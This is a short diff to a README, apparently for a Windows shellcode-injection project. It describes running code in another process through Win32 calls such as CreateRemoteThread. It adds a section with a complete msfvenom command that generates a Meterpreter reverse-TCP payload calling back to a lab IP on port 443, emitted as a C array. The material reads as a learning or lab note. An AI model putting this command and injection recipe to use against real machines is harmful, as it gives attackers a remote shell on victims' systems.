@@ -14,3 +14,11 @@ Simple shell injection using [win32 API](https://learn.microsoft.com/en-us/windo
 
 ## 4) Create a thread in the proccess to run your code that is in the proccess memory
 - The thread to deliver your payload using the function [CreateRemoteThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
+
+
+## Shell code generation
+With Metasploit I generated a shell code using
+
+```
+msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.129 LPORT=443 EXITFUNC=thread -f c --var-name=shellCode
+```
